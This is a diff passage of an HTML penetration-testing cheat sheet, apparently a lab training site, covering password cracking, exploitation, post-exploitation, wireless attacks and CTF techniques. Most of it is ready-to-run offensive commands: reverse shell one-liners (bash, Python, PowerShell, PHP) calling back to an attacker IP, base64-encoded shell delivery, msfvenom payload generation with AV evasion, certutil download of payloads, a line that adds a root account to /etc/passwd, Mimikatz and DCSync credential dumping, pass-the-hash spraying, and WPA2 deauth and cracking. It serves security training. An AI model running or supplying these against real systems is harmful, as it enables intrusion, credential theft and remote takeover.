+<span class="cm"># ffuf: virtual host discovery via Host header fuzzing</span>
+ffuf -u http://192.168.56.30/ \
+  -H "Host: FUZZ.target.com" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -mc 200,301,302 -fs 0</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 05 -->
+<template id="tpl-passwords">
+<article class="topic">
+  <h2>Password &amp; Hash Attacks</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Password attacks operate at L7 — Hydra brute-forces L7 authentication services (SSH, HTTP, RDP), while offline hash cracking with John and Hashcat works on hashes captured from the application layer (SAM database, LSASS, web app databases).</span>
+  </div>
+  <p>Password attacks cover online brute-force (live service), offline cracking (captured hashes), and wordlist generation. Match attack type to the scenario.
+    <a href="#" class="xref" onclick="loadTopic('postexploit'); return false;">Dump hashes post-exploitation ↗</a>
+  </p>
+
+  <h3>Hydra — Online Brute-Force</h3>
+  <pre><code># SSH brute-force
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.30 -t 4 -v
+
+# HTTP POST form login
+hydra -l admin -P rockyou.txt 192.168.56.30 http-post-form \
+  "/login.php:username=^USER^&password=^PASS^:Invalid credentials" -t 20
+
+# HTTP Basic Auth
+hydra -l admin -P rockyou.txt 192.168.56.30 http-get /admin/
+
+# RDP
+hydra -l administrator -P rockyou.txt rdp://192.168.56.30 -t 4
+
+# SMB
+hydra -l administrator -P rockyou.txt smb://192.168.56.30
+
+# Multiple usernames from file
+hydra -L users.txt -P rockyou.txt ssh://192.168.56.30 -t 4
+
+# Medusa alternative
+medusa -h 192.168.56.30 -u admin -P rockyou.txt -M ssh -t 4</code></pre>
+
+  <h3>John the Ripper — Hash Cracking</h3>
+  <pre><code># Identify hash type first
+hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
+hashid '$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy'
+
+# Crack /etc/shadow (need both /etc/passwd and /etc/shadow)
+unshadow /etc/passwd /etc/shadow > combined.txt
+john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Crack specific hash type
+john hashes.txt --format=NT --wordlist=rockyou.txt      # NTLM (Windows)
+john hashes.txt --format=Raw-MD5 --wordlist=rockyou.txt
+
+# Rules-based attack (mangling rules)
+john hashes.txt --wordlist=rockyou.txt --rules=KoreLogic
+
+# Show cracked passwords
+john hashes.txt --show
+
+# Zip / RAR / Office password recovery
+zip2john protected.zip > zip_hash.txt && john zip_hash.txt --wordlist=rockyou.txt
+rar2john protected.rar > rar_hash.txt && john rar_hash.txt
+office2john protected.docx > office_hash.txt && john office_hash.txt</code></pre>
+
+  <h3>Hashcat — GPU-Accelerated Cracking</h3>
+  <pre><code># Attack modes: 0=Dictionary, 1=Combination, 3=Mask, 6=Dict+Mask
+
+# Dictionary attack on NTLM hash (-m 1000)
+hashcat -m 1000 -a 0 ntlm_hash.txt rockyou.txt
+
+# Dictionary + rules
+hashcat -m 1000 -a 0 ntlm_hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# Mask attack (brute-force pattern)
+# ?l=lower ?u=upper ?d=digit ?s=special ?a=all
+hashcat -m 1000 -a 3 ntlm_hash.txt ?u?l?l?l?d?d?d?d   # Pa$$w0rd-style
+
+# Hybrid: dictionary + mask (append 4 digits to each word)
+hashcat -m 1000 -a 6 ntlm_hash.txt rockyou.txt ?d?d?d?d
+
+# Common hash modes
+# 0    = MD5
+# 100  = SHA-1
+# 1000 = NTLM (Windows)
+# 1800 = SHA-512 ($6$ Linux shadow)
+# 3200 = bcrypt ($2*$)
+# 13100 = Kerberoast (TGS-REP — AS-REP roasting)
+# 18200 = AS-REP Roast
+
+hashcat -m 13100 -a 0 kerberoast_hash.txt rockyou.txt    # Kerberoast</code></pre>
+
+  <h3>Wordlist Generation</h3>
+  <pre><code># crunch — generate custom wordlists
+crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o custom8.txt   # all 8-char combos (huge!)
+crunch 6 8 -t Target@@@@ -o target_pass.txt                       # pattern-based
+crunch 4 4 1234567890 -o pins.txt                                  # 4-digit PINs
+
+# cewl — spider a website and generate wordlist from content (great for org-specific passwords)
+cewl http://192.168.56.30/ -d 3 -m 6 -w cewl_words.txt
+
+# Add mutations with John rules
+john --wordlist=cewl_words.txt --rules --stdout > mutated.txt
+
+# Combine wordlists
+cat rockyou.txt cewl_words.txt | sort -u > combined.txt</code></pre>
+
+  <h3>Windows Password Hashes — Quick Reference</h3>
+  <table>
+    <thead><tr><th>Hash Type</th><th>Format</th><th>Where Found</th><th>Crack Mode</th></tr></thead>
+    <tbody>
+      <tr><td>LM</td><td><code>AAD3B435B51404EEAAD3...</code></td><td>SAM (pre-Vista)</td><td>hashcat -m 3000 (empty = <code>AAD3B435...</code> disabled)</td></tr>
+      <tr><td>NTLM</td><td><code>32-char hex</code></td><td>SAM, LSASS dump, NTDS.dit</td><td>hashcat -m 1000; pass-the-hash with crackmapexec</td></tr>
+      <tr><td>Net-NTLMv2</td><td><code>user::domain:challenge:hash</code></td><td>Responder capture</td><td>hashcat -m 5600 — cannot pass-the-hash</td></tr>
+      <tr><td>Kerberoast TGS</td><td><code>$krb5tgs$23$...</code></td><td>SPN ticket request</td><td>hashcat -m 13100</td></tr>
+      <tr><td>AS-REP Roast</td><td><code>$krb5asrep$23$...</code></td><td>Accounts with no preauthentication</td><td>hashcat -m 18200</td></tr>
+    </tbody>
+  </table>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Online brute-forcing with Hydra and hash identification</h4>
+      <ul>
+        <li>Hydra sends authentication attempts over L7 protocols (SSH, HTTP, SMB) — always use small thread counts (-t 4) for SSH/RDP to avoid account lockouts</li>
+        <li>Before cracking any hash, identify the type with <code>hashid</code> or <code>hash-identifier</code> — the wrong hashcat mode (-m) will produce no results</li>
+        <li>rockyou.txt (<code>/usr/share/wordlists/rockyou.txt</code>) covers most password cracking scenarios in lab environments</li>
+      </ul>
+      <pre><code><span class="cm"># Identify hash type then crack NTLM with dictionary attack</span>
+hashid '8846f7eaee8fb117ad06bdd830b7586c'
+hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Rules-based cracking and wordlist customization</h4>
+      <ul>
+        <li>Combine rockyou.txt with hashcat rules (<code>best64.rule</code>, <code>KoreLogic</code>) — rules apply transformations like adding numbers and capitalizing letters to catch "Password123!" patterns</li>
+        <li>Generate target-specific wordlists with <code>cewl</code> (spider the target website) then mutate with John rules — effective against org-specific passwords</li>
+      </ul>
+      <pre><code><span class="cm"># Targeted wordlist from website then mutate with John rules</span>
+cewl http://192.168.56.30/ -d 3 -m 6 -w cewl_words.txt
+john --wordlist=cewl_words.txt --rules=KoreLogic --stdout > mutated.txt
+hashcat -m 1000 -a 0 ntlm_hashes.txt mutated.txt</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Kerberoasting and AS-REP roasting in Active Directory</h4>
+      <ul>
+        <li>Kerberoasting requests TGS tickets for SPN-enabled service accounts — any domain user can do this at L7, no admin required</li>
+        <li>AS-REP roasting targets accounts with Kerberos pre-authentication disabled — can be done without credentials (unauthenticated at L7 to the KDC)</li>
+      </ul>
+      <pre><code><span class="cm"># Kerberoasting with impacket (request TGS tickets for all SPNs)</span>
+GetUserSPNs.py corp.local/user:Password1 -dc-ip 192.168.56.30 \
+  -request -outputfile kerberoast_hashes.txt
+hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt
+<span class="cm"># AS-REP roasting (no credentials required)</span>
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass \
+  -dc-ip 192.168.56.30 -outputfile asrep_hashes.txt
+hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt</code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 06 -->
+<template id="tpl-exploitation">
+<article class="topic">
+  <h2>Exploitation</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l3">L3 Network</span>
+    <span class="osi-chip l4">L4 Transport</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Exploitation spans layers depending on the vulnerability: EternalBlue exploits L4 TCP/SMB at port 445, web application exploits target L7 HTTP, and reverse shell callbacks establish new L3/L4 connections back to the attacker.</span>
+  </div>
+  <p>Exploitation uses discovered vulnerabilities to gain access. Always match exploits to target OS/service version to avoid crashes.
+    <a href="#" class="xref" onclick="loadTopic('scanning'); return false;">Service enumeration ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('postexploit'); return false;">After access — post-exploit ↗</a>
+  </p>
+
+  <h3>searchsploit — Exploit-DB Local Search</h3>
+  <pre><code># Search by product/version
+searchsploit apache 2.4.49
+searchsploit openssh 7.4
+searchsploit "windows 10" privilege escalation
+
+# Copy exploit to working directory
+searchsploit -m 50383       # copies by EDB-ID number
+
+# View raw exploit
+searchsploit -x 50383
+
+# Update database
+searchsploit -u
+
+# Search with JSON output for scripting
+searchsploit --json apache 2.4 | jq '.RESULTS_EXPLOIT[].Title'</code></pre>
+
+  <h3>Metasploit Quick Reference</h3>
+  <pre><code># Launch msfconsole
+msfconsole -q                 # -q = quiet, no banner
+
+# Database (for storing scan results)
+sudo msfdb init
+db_status
+db_nmap -sC -sV 192.168.56.30   # nmap scan saved to msf DB
+hosts                           # list discovered hosts
+services                        # list discovered services
+vulns                           # list identified vulns
+
+# Find and use a module
+search type:exploit name:eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+info                            # show module details, options, references
+show options
+set RHOSTS 192.168.56.30
+set LHOST 192.168.56.10
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run                             # or exploit</code></pre>
+
+  <h3>Manual Exploit Execution</h3>
+  <pre><code># Download exploit, review it, then run
+searchsploit -m 50383
+cat 50383.py | head -50         # ALWAYS review before running
+
+# Python exploit example (Apache path traversal CVE-2021-41773)
+python3 50383.py targets.txt /etc/passwd
+
+# Compile C exploit
+gcc exploit.c -o exploit && ./exploit 192.168.56.30
+
+# Setup netcat listener (catch reverse shell)
+nc -lvnp 4444
+
+# Or use pwncat-cs for feature-rich shell handling
+pwncat-cs -lp 4444</code></pre>
+
+  <h3>Reverse Shell One-Liners</h3>
+  <pre><code># Bash (Linux target — when command injection exists)
+bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
+
+# Python 3
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.56.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# PowerShell (Windows target)
+powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.56.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# PHP (web shell upload)
+php -r '$sock=fsockopen("192.168.56.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Upgrade dumb shell to PTY (after catching shell)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm</code></pre>
+
+  <div class="callout warn">
+    <strong>Encoding for filtered inputs:</strong> If special characters are blocked, encode payloads in Base64:
+    <code>echo 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1' | base64</code> then execute: <code>echo BASE64STRING | base64 -d | bash</code>
+  </div>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Using searchsploit and setting up a Metasploit exploit</h4>
+      <ul>
+        <li>Always use <code>searchsploit</code> first to find local exploit candidates by product and version — no internet needed after Kali install</li>
+        <li>In Metasploit, run <code>info</code> before <code>run</code> — it shows required RHOSTS/LHOST options and which payload types are compatible</li>
+        <li>Set up a netcat listener (<code>nc -lvnp 4444</code>) on Kali before triggering any reverse shell exploit so the connection is caught immediately</li>
+      </ul>
+      <pre><code><span class="cm"># Find exploit for Apache version, then set up listener</span>
+searchsploit apache 2.4.49
+nc -lvnp 4444 &amp;
+<span class="cm"># Run Metasploit EternalBlue against lab target</span>
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; \
+  set RHOSTS 192.168.56.30; set LHOST 192.168.56.10; run"</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Manual exploit execution and shell upgrading</h4>
+      <ul>
+        <li>Review every exploit script with <code>cat</code> or <code>head -100</code> before running — understand what it does to avoid unintended impact on the target</li>
+        <li>Always upgrade a dumb shell to a PTY immediately: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then Ctrl+Z → <code>stty raw -echo; fg</code> — gives you tab completion and proper signal handling</li>
+      </ul>
+      <pre><code><span class="cm"># Copy exploit to working dir, review, then execute</span>
+searchsploit -m 50383
+head -80 50383.py
+python3 50383.py targets.txt /etc/passwd
+<span class="cm"># After catching shell — upgrade to PTY</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Custom payload generation and AV evasion with msfvenom</h4>
+      <ul>
+        <li>Generate staged payloads with msfvenom when Metasploit's built-in payloads are detected by AV — use custom encoders and shellcode formats</li>
+        <li>Chain exploits: use an L7 web vulnerability (file upload) to deliver an L4 reverse shell that then pivots to an internal L3 segment using chisel</li>
+      </ul>
+      <pre><code><span class="cm"># Generate Windows exe reverse shell payload</span>
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.56.10 LPORT=4444 \
+  -f exe -o payload.exe
+<span class="cm"># Serve via HTTP for delivery</span>
+python3 -m http.server 80
+<span class="cm"># On target: certutil -urlcache -f http://192.168.56.10/payload.exe C:\Temp\p.exe</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 07 -->
+<template id="tpl-postexploit">
+<article class="topic">
+  <h2>Post-Exploitation</h2>
+  <div class="osi-bar">
+    <span class="osi-label">OSI Layers</span>
+    <span class="osi-chip l7">L7 Application</span>
+    <span class="osi-note">Post-exploitation operates at L7 — privilege escalation abuses OS-level application services (SUID binaries, scheduled tasks), credential dumping extracts hashes from application memory (LSASS), and pivoting establishes new L3/L4 tunnels through the compromised host.</span>
+  </div>
+  <p>After gaining initial access: situational awareness → privilege escalation → persistence → lateral movement → data access.
+    <a href="#" class="xref" onclick="loadTopic('exploitation'); return false;">← Initial access ↗</a>
+    <a href="#" class="xref" onclick="loadTopic('reporting'); return false;">Document findings ↗</a>
+  </p>
+
+  <h3>Situational Awareness (Linux)</h3>
+  <pre><code># Who am I / what can I do?
+id && whoami
+sudo -l                          # what sudo permissions do I have?
+cat /etc/passwd | grep -v nologin
+cat /etc/sudoers 2>/dev/null
+
+# System info
+uname -a                         # kernel version (for exploit search)
+cat /etc/os-release
+hostname && ip a
+ss -tunlp                        # listening ports
+ps aux                           # running processes
+env                              # environment variables (may contain creds)
+
+# Find interesting files
+find / -perm -u=s -type f 2>/dev/null    # SUID binaries
+find / -writable -type f 2>/dev/null | grep -v proc
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+cat ~/.bash_history              # command history
+cat ~/.ssh/id_rsa 2>/dev/null   # SSH private key</code></pre>
+
+  <h3>Privilege Escalation — Linux</h3>
+  <pre><code># LinPEAS — automated local enumeration (upload to target)
+curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# Or transfer file: on Kali: python3 -m http.server 80; on target: wget http://192.168.56.10/linpeas.sh
+
+# GTFOBins — check SUID binaries against https://gtfobins.github.io/
+find / -perm -4000 2>/dev/null  # find SUID binaries
+# Example: if /usr/bin/find is SUID
+/usr/bin/find . -exec /bin/sh -p \; -quit
+
+# Cron job abuse
+cat /etc/crontab && ls -la /etc/cron*
+# If writable script runs as root, add: bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
+
+# Weak file permissions
+ls -la /etc/passwd /etc/shadow   # shadow readable = extract and crack
+# If passwd writable: add root2:$(openssl passwd -1 hacked):0:0::/root:/bin/bash
+
+# Kernel exploits (last resort — may crash system)
+uname -r    # check kernel version against CVEdetails.com</code></pre>
+
+  <h3>Privilege Escalation — Windows</h3>
+  <pre><code"># WinPEAS — automated Windows enumeration
+# Upload via SMB or certutil
+certutil -urlcache -f http://192.168.56.10/winpeas.exe C:\Temp\winpeas.exe
+C:\Temp\winpeas.exe
+
+# Manual checks in PowerShell
+whoami /priv                    # check for SeImpersonatePrivilege (Potato attacks!)
+whoami /groups
+Get-LocalUser                   # list users
+Get-LocalGroupMember Administrators
+systeminfo                      # OS version, hotfixes
+
+# AlwaysInstallElevated — MSI installs as SYSTEM if both reg keys = 1
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both 0x1: generate malicious MSI with msfvenom and install it
+
+# SeImpersonatePrivilege → PrintSpoofer / GodPotato / JuicyPotato
+.\PrintSpoofer64.exe -i -c powershell.exe   # spawns SYSTEM shell
+
+# Stored credentials
+cmdkey /list                    # cached credentials
+dir C:\Users\*\AppData\Roaming\*.xml 2>nul  # may contain saved passwords</code></pre>
+
+  <h3>Credential Dumping (Windows)</h3>
+  <pre><code># Mimikatz (requires SYSTEM/Administrator)
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords         # dump creds from LSASS (plaintext if WDigest enabled)
+sekurlsa::wdigest                # enable WDigest (needs reauth to populate)
+lsadump::sam                     # dump SAM database hashes
+lsadump::dcsync /user:krbtgt     # DCSync — pull any hash from DC
+
+# From Metasploit (after getting session)
+use post/windows/gather/hashdump
+run
+
+# CrackMapExec — post-compromise credential testing
+crackmapexec smb 192.168.56.0/24 -u administrator -H NTLMHASH --local-auth
+crackmapexec smb 192.168.56.30 -u admin -p Password1 --sam    # dump SAM
+crackmapexec winrm 192.168.56.30 -u admin -p Password1 -x "whoami"</code></pre>
+
+  <h3>Pivoting &amp; Tunneling</h3>
+  <pre><code># chisel — TCP tunneling (forward pivot: access internal network via compromised host)
+# On Kali (server):
+./chisel server -p 8080 --reverse
+
+# On compromised host (client):
+./chisel client 192.168.56.10:8080 R:socks         # SOCKS5 proxy on Kali :1080
+./chisel client 192.168.56.10:8080 R:3389:192.168.100.10:3389  # port forward
+
+# Configure proxychains to use SOCKS5
+echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
+proxychains nmap -sT -Pn 192.168.100.10    # scan internal host through pivot
+
+# SSH tunneling
+ssh -L 8080:192.168.100.10:80 user@192.168.56.20   # local port forward
+ssh -D 1080 user@192.168.56.20                      # dynamic SOCKS proxy
+
+# Metasploit autoroute + socks
+route add 192.168.100.0/24 SESSION_ID
+use auxiliary/server/socks_proxy; run</code></pre>
+
+  <hr class="tier-divider">
+  <div class="tier-heading">Skill Tiers</div>
+  <details class="tier beginner" open>
+    <summary>🟢 Beginner — Core Concepts</summary>
+    <div class="tier-body">
+      <h4>Situational awareness after initial access</h4>
+      <ul>
+        <li>Run <code>id</code>, <code>sudo -l</code>, and <code>uname -a</code> immediately after gaining a shell — these three commands establish who you are, what you can do, and what kernel exploit might apply</li>
+        <li>Check <code>ss -tunlp</code> for locally listening services — internal services not exposed to the network are common privesc vectors</li>
+        <li>Search for SUID binaries with <code>find / -perm -u=s -type f 2>/dev/null</code> and check each against GTFOBins.github.io</li>
+      </ul>
+      <pre><code><span class="cm"># Immediate situational awareness commands after shell access</span>
+id && whoami && sudo -l
+uname -r && cat /etc/os-release
+ss -tunlp && find / -perm -u=s -type f 2>/dev/null</code></pre>
+    </div>
+  </details>
+  <details class="tier intermediate">
+    <summary>🟡 Intermediate — Deeper Skills</summary>
+    <div class="tier-body">
+      <h4>Automated privilege escalation enumeration</h4>
+      <ul>
+        <li>Run LinPEAS (Linux) or WinPEAS (Windows) to automate the enumeration of hundreds of privilege escalation vectors — look for yellow/red highlighted findings first</li>
+        <li>On Windows, <code>whoami /priv</code> showing <code>SeImpersonatePrivilege</code> is almost always exploitable with PrintSpoofer or GodPotato to reach SYSTEM</li>
+      </ul>
+      <pre><code><span class="cm"># Transfer and run LinPEAS for automated Linux privesc enumeration</span>
+<span class="cm"># On Kali: </span>
+python3 -m http.server 80
+<span class="cm"># On target: </span>
+wget http://192.168.56.10/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh | tee /tmp/lp.out
+<span class="cm"># Windows — check for SeImpersonatePrivilege</span>
+<span class="cm"># whoami /priv | findstr SeImpersonatePrivilege</span></code></pre>
+    </div>
+  </details>
+  <details class="tier advanced">
+    <summary>🔴 Advanced — Expert Techniques</summary>
+    <div class="tier-body">
+      <h4>Credential dumping and lateral movement with CrackMapExec</h4>
+      <ul>
+        <li>After dumping NTLM hashes with Mimikatz or hashdump, use CrackMapExec to test those hashes across all hosts in the subnet via pass-the-hash — no cracking required</li>
+        <li>DCSync (<code>lsadump::dcsync /user:krbtgt</code>) pulls the krbtgt hash from any domain admin account — enables Golden Ticket attacks for persistent domain access</li>
+      </ul>
+      <pre><code><span class="cm"># Dump hashes, then spray across subnet with pass-the-hash</span>
+<span class="cm"># In meterpreter: run post/windows/gather/hashdump</span>
+crackmapexec smb 192.168.56.0/24 \
+  -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c \
+  --local-auth --sam
+<span class="cm"># DCSync to pull krbtgt hash (domain admin required)</span>
+<span class="cm"># lsadump::dcsync /user:krbtgt /domain:corp.local</span></code></pre>
+    </div>
+  </details>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 08 -->
+<template id="tpl-wireless">
+<article class="topic">
+  <h2>Wireless Attacks</h2>
+  <p><strong>Authorized testing only.</strong> Wireless attacks require a compatible adapter with monitor mode and packet injection (e.g., Alfa AWUS036ACH). Only test networks you own or have explicit written permission to test.</p>
+
+  <h3>Required Hardware &amp; Setup</h3>
+  <pre><code># Check adapter capabilities
+iw list | grep "Supported interface modes" -A 10
+iw list | grep "Supported commands" | grep -i monitor
+
+# Enable monitor mode
+sudo airmon-ng check kill        # kill interfering processes (NetworkManager, wpa_supplicant)
+sudo airmon-ng start wlan0       # creates wlan0mon
+
+# Verify monitor mode
+iwconfig wlan0mon
+
+# Return to managed mode
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager</code></pre>
+
+  <h3>WPA2 Handshake Capture &amp; Crack</h3>
+  <pre><code"># Step 1 — Find target network
+sudo airodump-ng wlan0mon
+# Note: BSSID (AP MAC), CH (channel), ESSID (network name), STATION (connected clients)
+
+# Step 2 — Capture on target channel
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+# -c 6 = channel, -w = write to capture.cap
+
+# Step 3 — Deauth a client to force WPA2 handshake
+sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+# The client reconnects, and the 4-way handshake is captured
+
+# Step 4 — Verify handshake captured
+aircrack-ng capture-01.cap       # should say "WPA (1 handshake)"
+
+# Step 5 — Crack with wordlist
+aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# Step 5 (alternative) — Convert to hashcat format and use GPU
+hcxpcapngtool -o capture.hc22000 capture-01.cap
+hashcat -m 22000 capture.hc22000 rockyou.txt</code></pre>
+
+  <h3>WPS PIN Attack</h3>
+  <pre><code># Scan for WPS-enabled APs
+sudo wash -i wlan0mon
+
+# Pixie-Dust attack (offline, works on vulnerable implementations)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vvv
+
+# Standard WPS PIN brute-force (slow: ~11000 attempts, ~4 hrs)
+sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vvv</code></pre>
+
+  <h3>Evil Twin / Captive Portal</h3>
+  <pre><code># hostapd-wpe — rogue AP for EAP credential harvesting (enterprise WPA2)
+# Configuration file: /etc/hostapd-wpe/hostapd-wpe.conf
+# Set ssid, interface, channel to match target
+sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+# Captured EAP credentials appear in terminal — crack MSCHAPv2 with hashcat -m 5500</code></pre>
+
+  <div class="callout">
+    <strong>Adapter Chipset Recommendations:</strong> Alfa AWUS036ACH (RTL8812AU) — dual-band, injection, monitor mode. Alfa AWUS036NHA (AR9271) — 2.4GHz, excellent compatibility. Panda PAU09 — budget option with injection support.
+  </div>
+</article>
+</template>
+
+<!-- ═══════════════════════════════════════════════════════ SECTION 09 -->
+<template id="tpl-ctf">
+<article class="topic">
+  <h2>CTF Techniques</h2>
+  <p>CTF (Capture The Flag) competitions cover cryptography, steganography, reverse engineering, pwn (binary exploitation), forensics, and web challenges.</p>
+
+  <h3>Steganography</h3>
+  <pre><code># Check file type (files are often mislabeled)
+file mystery.jpg
+binwalk mystery.jpg               # detect embedded files
+xxd mystery.jpg | head -30        # view raw hex
+
+# steghide — hide/extract data in JPEG/BMP/WAV/AU
+steghide info mystery.jpg                          # info (may prompt for passphrase)
+steghide extract -sf mystery.jpg -p ""             # extract with empty passphrase
+steghide extract -sf mystery.jpg -p "password"     # extract with known passphrase
+
+# stegcracker — brute-force steghide passphrase
+stegcracker mystery.jpg /usr/share/wordlists/rockyou.txt
+
+# zsteg — detect LSB steganography in PNG/BMP
+zsteg mystery.png
+zsteg -a mystery.png              # try all methods
+
+# exiftool — check metadata for hidden messages
+exiftool mystery.jpg | grep -i "comment\|description\|user"
+
+# strings — find ASCII text in binary files
+strings mystery.jpg | grep -E "[A-Za-z0-9+/]{20,}={0,2}"  # base64
+strings mystery.jpg | grep -i "flag\|ctf\|htb\|thm"
+
+# Binwalk — extract embedded archives/files
+binwalk -e mystery.jpg            # extract all detected files to _mystery.jpg.extracted/</code></pre>
+
+  <h3>Cryptography &amp; Encoding</h3>
+  <pre><code># Identify hash
+hash-identifier 5f4dcc3b5aa765d61d8327deb882cf99
+hashid -m '$2y$10$abc...'    # -m = show hashcat mode
+
+# Common encoding / decoding (CyberChef is the go-to GUI tool)
+echo "aGVsbG8=" | base64 -d                         # Base64 decode
+echo "68656c6c6f" | xxd -r -p                         # hex decode
+echo "hello" | tr 'A-Za-z' 'N-ZA-Mn-za-m'            # ROT13
+
+# caesar cipher brute-force
+for i in {1..25}; do echo -n "Shift $i: "; echo "ENCODED" | tr 'A-Za-z' $(printf '%s' $(echo {A..Z}{a..z} | tr -d ' ' | cut -c$((i+1))-52,1-$i$(echo {a..z} | tr -d ' ' | cut -c$((i+1))-26,1-$i))); done
+
+# Vigenere cipher — online solvers or dcode.fr / cyberchef
+
+# RSA CTF basics (with known n, e, c — use Python)
+python3 -c "
+from Crypto.Util.number import long_to_bytes
+# Given: n, e, c, and small exponent attack (e=3 with small m)
+import gmpy2
+m, _ = gmpy2.iroot(c, 3)    # cube root attack if e=3
+print(long_to_bytes(m))
+"</code></pre>
+
+  <h3>Forensics &amp; File Analysis</h3>
+  <pre><code># Volatility 3 — memory forensics
+vol -f memory.dmp windows.info
+vol -f memory.dmp windows.pslist              # process list
+vol -f memory.dmp windows.cmdline            # command lines
+vol -f memory.dmp windows.netscan            # network connections
+vol -f memory.dmp windows.filescan | grep flag
+vol -f memory.dmp windows.dumpfiles --virtaddr 0x... # dump specific file
+vol -f memory.dmp windows.hashdump           # extract NTLM hashes
+
+# Wireshark / tshark — network forensics
+tshark -r capture.pcap -T fields -e http.request.uri | sort -u
+tshark -r capture.pcap -Y "ftp-data" -w ftp_data.pcap
+tshark -r capture.pcap -Y 'tcp.stream eq 0' -z follow,tcp,ascii,0
+
+# Foremost / photorec — file carving from disk images
+foremost -i disk.img -o recovered/
+photorec disk.img                             # GUI-guided recovery</code></pre>
+
+  <h3>Reverse Engineering Basics</h3>
+  <pre><code># Static analysis
+file binary                    # ELF? PE? architecture?
+strings binary | grep -i flag  # look for plaintext
+ltrace ./binary                # library calls
+strace ./binary                # system calls
+objdump -d binary | grep -A5 "main"   # disassemble
+
+# GDB debugger
+gdb ./binary
+break main
+run
+info registers
+x/20x $rsp                    # examine stack
+
+# Ghidra — open source NSA reverse engineering tool
+# Launch: /opt/ghidra/ghidraRun; create project; import binary; auto-analyze
+# CodeBrowser → Functions → main → decompiler pane shows pseudo-C code
+
+# pwndbg — enhanced GDB for CTF pwn challenges
+gdb -q ./vulnerable_binary
+# cyclic 200 — generate de Bruijn sequence to find offset
+# cyclic -l 0x6161616c — find offset from crash address</code></pre>
